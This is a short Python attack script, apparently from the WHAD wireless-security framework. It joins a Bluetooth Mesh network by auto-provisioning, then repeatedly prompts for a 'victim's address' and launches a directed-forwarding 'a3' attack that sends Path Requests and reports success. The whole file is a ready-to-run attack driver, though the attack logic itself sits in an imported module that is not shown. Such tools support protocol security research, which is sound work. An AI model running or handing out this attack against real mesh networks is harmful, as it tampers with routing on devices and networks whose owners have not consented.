from whad.exceptions import WhadDeviceNotFound

from whad.device import WhadDevice
from whad.ble.exceptions import ConnectionLostException
import sys
from whad.btmesh.connector.df_attack import DFAttacks


if len(sys.argv) != 2:
    # Retrieve target interface
    print("Usage: %s [provisionee]" % sys.argv[0])
    exit(1)


interface = sys.argv[1]

try:
    dev = WhadDevice.create(interface)

    connector = DFAttacks(dev)

    connector.profile.auto_provision()
    connector.start()

    print("Node is provisioned !")

    while True:
        addr = input("Please enter the victim's address.... (int)")
        try:
            addr = int(addr, 0) & 0xFFFF
        except ValueError:
            print("Wrong format for adress, please provide a 2 bytes int")
            continue

        print("Sending Path Request, waiting for response ....")
        res = connector.a3_attack(addr)
        if res:
            print("Path Request received, attack probably successful.")
        else:
            print("Attack failed, try again")


except ConnectionLostException as e:
    print("Connection lost", e)

except (KeyboardInterrupt, SystemExit):
    dev.close()

except WhadDeviceNotFound:
    print("[e] Device not found")
    exit(1)
while True:
    pass
